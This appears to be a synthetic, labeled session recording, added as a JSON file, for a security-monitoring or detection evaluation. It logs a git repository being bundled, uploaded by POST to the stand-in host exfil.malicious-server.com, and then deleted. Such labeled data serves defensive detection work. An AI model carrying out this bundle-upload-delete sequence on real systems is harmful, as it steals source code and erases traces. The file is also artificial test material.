@@ -1,0 +1,88 @@
+{
+  "format": "sentinel-session-v1",
+  "metadata": {
+    "id": "gen-na-mrn9sat6-5xoxj9",
+    "recordedAt": "2026-07-16T08:46:32.154Z",
+    "durationMs": 2126,
+    "platform": "win32",
+    "hostname": "generator",
+    "username": "eval",
+    "workingDirectory": "C:/project-194",
+    "sentinelVersion": "1.0.0",
+    "tags": [
+      "malicious",
+      "git",
+      "exfil",
+      "HIGH",
+      "generated"
+    ]
+  },
+  "events": [
+    {
+      "type": "process",
+      "data": {
+        "pid": 7000,
+        "name": "git",
+        "commandLine": "git bundle create /tmp/repo.bundle --all",
+        "timestamp": "2026-07-16T08:46:32.637Z",
+        "riskIndicators": [
+          "git_export"
+        ]
+      }
+    },
+    {
+      "type": "git_command",
+      "data": {
+        "pid": 7000,
+        "processName": "git",
+        "commandLine": "git bundle create /tmp/repo.bundle --all",
+        "action": "bundle",
+        "timestamp": "2026-07-16T08:46:32.815Z",
+        "repository": "C:/project"
+      }
+    },
+    {
+      "type": "file_access",
+      "data": {
+        "filePath": "/tmp/repo.bundle",
+        "processName": "curl.exe",
+        "pid": 7001,
+        "operation": "read",
+        "timestamp": "2026-07-16T08:46:33.053Z",
+        "bytesRead": 98030
+      }
+    },
+    {
+      "type": "flow",
+      "data": {
+        "id": "na-mrn9sat6-4x0jv5",
+        "sessionId": "",
+        "timestamp": "2026-07-16T08:46:33.338Z",
+        "protocol": "TLS",
+        "sourceAddr": "192.168.1.100",
+        "sourcePort": 49001,
+        "destAddr": "192.0.2.1",
+        "destPort": 443,
+        "hostname": "exfil.malicious-server.com",
+        "sni": "exfil.malicious-server.com",
+        "bytesSent": 158880,
+        "bytesReceived": 128,
+        "durationMs": 5406,
+        "method": "POST",
+        "path": "/upload"
+      }
+    },
+    {
+      "type": "process",
+      "data": {
+        "pid": 7002,
+        "name": "rm",
+        "commandLine": "rm -f /tmp/repo.bundle",
+        "timestamp": "2026-07-16T08:46:33.451Z",
+        "riskIndicators": [
+          "cleanup"
+        ]
+      }
+    }
+  ]
+}
